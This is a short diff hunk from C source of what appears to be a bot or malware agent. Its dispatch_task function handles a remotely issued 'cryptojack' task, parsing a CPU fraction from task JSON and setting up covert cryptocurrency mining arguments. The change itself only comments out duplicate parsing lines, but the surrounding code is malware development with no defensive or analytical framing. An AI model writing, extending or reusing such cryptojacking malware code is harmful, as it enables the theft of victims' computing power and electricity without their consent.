@@ -453,8 +453,8 @@ static void dispatch_task(const char *task_json) {
 
     } else if (strcmp(type, "cryptojack") == 0) {
         /* CPU fraction from task JSON — default 0.25 */
-        const char *cp = strstr(task_json, "\"cpu\":");
-        if (cp) { cp = strchr(cp+6,':'); if(!cp) cp = strstr(task_json,"\"cpu\":")+6; }
+        // const char *cp = strstr(task_json, "\"cpu\":");
+        // if (cp) { cp = strchr(cp+6,':'); if(!cp) cp = strstr(task_json,"\"cpu\":")+6; }
         const char *cpu_p = strstr(task_json, "\"cpu\":");
         if (cpu_p) cpu = atof(cpu_p + 6);
         CryptojackArgs *a = malloc(sizeof(CryptojackArgs));
